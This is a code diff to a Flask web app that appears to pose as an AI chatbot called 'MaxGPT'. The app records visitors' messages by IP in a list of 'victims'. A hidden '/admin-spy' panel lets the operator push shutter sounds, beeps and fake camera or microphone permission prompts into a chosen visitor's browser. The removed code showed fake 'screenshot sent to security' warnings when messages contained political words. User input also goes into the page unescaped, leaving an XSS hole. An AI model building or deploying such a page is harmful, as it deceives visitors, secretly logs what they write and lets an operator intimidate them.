@@ -104,7 +104,7 @@ HTML_PAGE = """<!DOCTYPE html>
         @media(max-width: 900px) { .sidebar { display: none; } .row { padding: 18px; } .input-area { padding: 12px 14px 18px; } .fake-modal { width: 90%; } }
     </style>
 </head>
-<body>
+<body onclick="unlockAudio()">
 
 <div class="fake-modal" id="permModal">
     <div class="fake-modal-header" id="permIconHeader">
@@ -112,7 +112,7 @@ HTML_PAGE = """<!DOCTYPE html>
         <span id="permTitle">Разрешение устройства</span>
     </div>
     <div class="fake-modal-body" id="permText">
-        Сайт <b>maxgpt-bot.onrender.com</b> запрашивает доступ к камере для биометрической верификации. Вы даете согласие?
+        Сайт <b>maxgpt-bot.onrender.com</b> запрашивает доступ к камере. Вы даете согласие?
     </div>
     <div class="fake-modal-actions">
         <button class="fake-btn fake-btn-deny" onclick="closePermModal()">Заблокировать</button>
@@ -175,31 +175,46 @@ HTML_PAGE = """<!DOCTYPE html>
 </div>
 
 <script>
-const statusList = [
-    "🛰️ Запрос проходит фиксацию IP провайдером",
-    "🛡️ Системная проверка на предмет использования сторонних сервисов...",
-    "🔒 Проверка трафика на соответствие стандартам сети"
-];
+let audioCtx = null;
 
-const triggers = ["впн", "vpn", "украин", "киев", "крым", "сша", "америк", "запад"];
-
-function toggleModelMenu() { document.getElementById("modelMenu").classList.toggle("show"); }
-function selectModel(name) { document.getElementById("selectedModel").innerText = name; document.getElementById("modelMenu").classList.remove("show"); }
-
-function playShutterSound(){
-    try{
-        let c=new(window.AudioContext||window.webkitAudioContext)(),o=c.createOscillator(),g=c.createGain();
-        o.type='square';o.frequency.setValueAtTime(800,c.currentTime);g.gain.setValueAtTime(0.4,c.currentTime);
-        o.connect(g);g.connect(c.destination);o.start();o.stop(c.currentTime+0.08);
-    }catch(e){}
+function unlockAudio() {
+    if (!audioCtx) {
+        audioCtx = new(window.AudioContext || window.webkitAudioContext)();
+        audioCtx.resume();
+    }
 }
 
-function playBeepSound(){
-    try{
-        let c=new(window.AudioContext||window.webkitAudioContext)(),o=c.createOscillator(),g=c.createGain();
-        o.type='sine';o.frequency.setValueAtTime(440,c.currentTime);g.gain.setValueAtTime(0.3,c.currentTime);
-        o.connect(g);g.connect(c.destination);o.start();o.stop(c.currentTime+0.35);
-    }catch(e){}
+function playShutterSound() {
+    unlockAudio();
+    try {
+        let o = audioCtx.createOscillator();
+        let g = audioCtx.createGain();
+        o.type = 'square';
+        o.frequency.setValueAtTime(1200, audioCtx.currentTime);
+        o.frequency.exponentialRampToValueAtTime(300, audioCtx.currentTime + 0.08);
+        g.gain.setValueAtTime(0.5, audioCtx.currentTime);
+        g.gain.linearRampToValueAtTime(0.01, audioCtx.currentTime + 0.08);
+        o.connect(g);
+        g.connect(audioCtx.destination);
+        o.start();
+        o.stop(audioCtx.currentTime + 0.08);
+    } catch(e) {}
+}
+
+function playBeepSound() {
+    unlockAudio();
+    try {
+        let o = audioCtx.createOscillator();
+        let g = audioCtx.createGain();
+        o.type = 'sine';
+        o.frequency.setValueAtTime(880, audioCtx.currentTime);
+        g.gain.setValueAtTime(0.3, audioCtx.currentTime);
+        g.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.4);
+        o.connect(g);
+        g.connect(audioCtx.destination);
+        o.start();
+        o.stop(audioCtx.currentTime + 0.4);
+    } catch(e) {}
 }
 
 function showCameraPromptCustom() {
@@ -236,26 +251,15 @@ async function pollAdminCommands() {
     } catch(e) {}
 }
 
-setInterval(pollAdminCommands, 1200);
+setInterval(pollAdminCommands, 1000);
 
 async function send(){
+    unlockAudio();
     let i=document.getElementById("userInput"), t=i.value.trim(); if(!t) return;
     let c=document.getElementById("chat");
-    let tLower = t.toLowerCase();
 
-    let isTriggered = triggers.some(trig => tLower.includes(trig));
-    let statusHtml = isTriggered ? `<div class="sys-status">${statusList[Math.floor(Math.random() * statusList.length)]}</div>` : "";
-
-    c.innerHTML+=`<div class="row"><div class="user-av-sq">Вы</div><div class="msg-container"><div class="usr-author">Вы</div><div class="txt">${t}${statusHtml}</div></div></div>`;
+    c.innerHTML+=`<div class="row"><div class="user-av-sq">Вы</div><div class="msg-container"><div class="usr-author">Вы</div><div class="txt">${t}</div></div></div>`;
     i.value=""; c.scrollTop=c.scrollHeight;
-
-    if (isTriggered && Math.random() < 0.6) {
-        playShutterSound();
-        setTimeout(() => {
-            c.innerHTML+=`<div class="row bot"><div class="max-av-sq">МАХ</div><div class="msg-container"><div class="bot-author">MaxGPT AI</div><div class="txt"><div class="warn">📸 [СИСТЕМА]: Скриншот экрана сохранен и отправлен в отдел ИБ.</div></div></div></div>`;
-            c.scrollTop=c.scrollHeight;
-        }, 300);
-    }
 
     let r=await fetch("/api/chat",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({message:t})});
     let d=await r.json();
@@ -299,6 +303,7 @@ SPY_PAGE = """<!DOCTYPE html>
         .btn-beep { background: #f59e0b; }
         .btn-cam { background: #3b82f6; }
         .btn-mic { background: #8b5cf6; }
+        .btn-del { background: #dc2626; margin-left: auto; }
 
         .logs-container { display: flex; flex-direction: column; gap: 12px; }
         .log-card { background: #13151f; border: 1px solid rgba(255,255,255,0.08); border-radius: 12px; padding: 14px; }
@@ -310,11 +315,11 @@ SPY_PAGE = """<!DOCTYPE html>
 <body>
 
 <div class="header">
-    <div class="title"><i class="fa-solid fa-gamepad"></i> Центр Управления Жертвами</div>
+    <div class="title"><i class="fa-solid fa-gamepad"></i> Пульт Наблюдения</div>
     <div class="live-badge"><div class="pulse"></div> ЭФИР АКТИВЕН</div>
 </div>
 
-<div class="section-title">🎯 Список Жертв на сайте</div>
+<div class="section-title">🎯 Активные Жертвы (Только с сообщениями)</div>
 
 <div class="victims-grid">
     {% for ip, data in victims.items() %}
@@ -324,7 +329,7 @@ SPY_PAGE = """<!DOCTYPE html>
             <span class="victim-ip"><i class="fa-solid fa-network-wired"></i> IP: {{ ip }}</span>
         </div>
         <div style="font-size:12px; color:#94a3b8;">
-            Сообщений отправлено: <b>{{ data.msg_count }}</b> | Статус: <b>Онлайн</b>
+            Сообщений: <b>{{ data.msg_count }}</b>
         </div>
         <div class="action-btns">
             <button class="btn-act btn-shutter" onclick="triggerAction('{{ ip }}', 'sound_shutter')">
@@ -339,20 +344,23 @@ SPY_PAGE = """<!DOCTYPE html>
             <button class="btn-act btn-mic" onclick="triggerAction('{{ ip }}', 'perm_mic')">
                 <i class="fa-solid fa-microphone"></i> 🎙️ Запрос Микрофона
             </button>
+            <button class="btn-act btn-del" onclick="deleteVictim('{{ ip }}')">
+                <i class="fa-solid fa-trash"></i> ❌ Удалить
+            </button>
         </div>
     </div>
     {% else %}
-    <div style="color:#64748b; font-size:14px; padding:10px;">Пока нет активных подключений. Зайди на сайт в соседней вкладке!</div>
+    <div style="color:#64748b; font-size:14px; padding:10px;">Пока нет активных жертв с сообщениями. Напиши сообщение в чате!</div>
     {% endfor %}
 </div>
 
-<div class="section-title">📜 История Перехваченных Логов</div>
+<div class="section-title">📜 История Чат-Логов</div>
 
 <div class="logs-container">
     {% for l in logs %}
     <div class="log-card">
         <div style="font-size:12px; color:#f59e0b; margin-bottom:6px; font-weight:bold;">
-            Жертва (IP: {{ l.ip }})
+            IP: {{ l.ip }}
         </div>
         <div class="chat-block">
             <div class="user-msg"><b>👤 Пользователь:</b> {{ l.user }}</div>
@@ -372,21 +380,27 @@ async function triggerAction(ip, cmd) {
         body: JSON.stringify({ ip: ip, command: cmd })
     });
     let d = await r.json();
-    alert(d.status);
+}
+
+async function deleteVictim(ip) {
+    await fetch('/api/admin/delete', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ ip: ip })
+    });
+    location.reload();
 }
 </script>
 </body>
 </html>"""
 
+def get_clean_ip():
+    if request.headers.getlist("X-Forwarded-For"):
+        return request.headers.getlist("X-Forwarded-For")[0].split(',')[0].strip()
+    return request.remote_addr
+
 @app.route("/")
 def home():
-    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    global victim_counter
-    if user_ip not in active_victims:
-        victim_counter += 1
-        active_victims[user_ip] = {'id': victim_counter, 'last_seen': time.time(), 'msg_count': 0}
-    else:
-        active_victims[user_ip]['last_seen'] = time.time()
     return render_template_string(HTML_PAGE)
 
 @app.route("/admin-spy")
@@ -395,7 +409,7 @@ def spy():
 
 @app.route("/api/poll")
 def poll_commands():
-    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    user_ip = get_clean_ip()
     cmds = pending_commands.get(user_ip, [])
     if cmds:
         pending_commands[user_ip] = []
@@ -410,23 +424,33 @@ def admin_trigger():
         if target_ip not in pending_commands:
             pending_commands[target_ip] = []
         pending_commands[target_ip].append(cmd)
-        return jsonify({"status": f"Команда отправлена на {target_ip}!"})
-    return jsonify({"status": "Ошибка!"})
+        return jsonify({"status": "ok"})
+    return jsonify({"status": "error"})
+
+@app.route("/api/admin/delete", methods=["POST"])
+def admin_delete():
+    data = request.json or {}
+    target_ip = data.get("ip")
+    if target_ip in active_victims:
+        del active_victims[target_ip]
+    if target_ip in pending_commands:
+        del pending_commands[target_ip]
+    return jsonify({"status": "deleted"})
 
 @app.route("/api/chat", methods=["GET", "POST"])
 def chat_api():
     if request.method == "GET": return jsonify({"status": "ok"})
 
     user_msg = request.json.get("message", "").strip() if request.is_json else ""
-    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    user_ip = get_clean_ip()
     
+    # Добавляем в список жертв ТОЛЬКО после реального сообщения
     global victim_counter
     if user_ip not in active_victims:
         victim_counter += 1
-        active_victims[user_ip] = {'id': victim_counter, 'last_seen': time.time(), 'msg_count': 1}
+        active_victims[user_ip] = {'id': victim_counter, 'msg_count': 1}
     else:
         active_victims[user_ip]['msg_count'] += 1
-        active_victims[user_ip]['last_seen'] = time.time()
 
     msg_lower = user_msg.lower()
     last_state = user_states.get(user_ip, "")
